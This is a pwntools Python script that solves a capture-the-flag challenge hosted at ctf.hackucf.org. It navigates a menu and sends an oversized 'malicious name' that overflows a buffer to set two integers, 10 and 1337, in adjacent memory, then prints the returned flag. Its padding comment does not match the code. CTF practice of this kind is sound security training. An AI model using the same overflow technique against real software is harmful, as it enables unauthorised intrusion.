from pwn import *

# Set up the process
# p = process('a.out')
p = remote('ctf.hackucf.org', 7001)

# Wait for the process to ask for a name
response = p.recvuntil("Name: ")
print(response.decode())
# Wait for user #input
#input("Press Enter to send name...")

# Send "hello" to the binary
sixteen_byte_name = "A"*2
byte_arr = bytearray()
byte_arr.extend(sixteen_byte_name.encode())
# add null byte
byte_arr.extend(b"\x00")
print(byte_arr)
p.send(byte_arr)

# Wait for a response
response = p.recvuntil("Fingers: ")
print(response.decode())

#input("Press Enter to send 5...")

# Send "5" to the binary
p.sendline("5")

response = p.recvuntil("Gender: ")
print(response.decode())

#input("Press Enter to send 1...")

p.sendline("1")

response = p.recvuntil("Choice: ")
print(response.decode())

#input("Press Enter to send 2...")

# Change name
p.sendline("2")

response = p.recvuntil("one?\n")
print(response.decode())

# Send malicious name | 32 bytes 'A' | 8 bytes 'A' | 4 bytes: int 10d (little endian) | 4 bytes: int 1337d (little endian)

bytse_arr_first = "A"*12 + "A"*7 + "\n"
bytes_arr = bytearray()
bytes_arr.extend(bytse_arr_first.encode())
bytes_arr.extend(p32(10))
bytes_arr.extend(p32(1337))

print(bytes_arr)

input("Press Enter to send malicious name...")

p.send(bytes_arr)

response = p.recvuntil("Choice: ")
print(response.decode())

#input("Press Enter to send 3...")

# Send "3" to the binary
p.sendline("3")

# Wait for the final response in while 1
while True:
    response = p.recvline()
    print(response.decode())
    if "}" in response.decode():
        break
#input("Press Enter to close the process...")

# Close the process
p.close()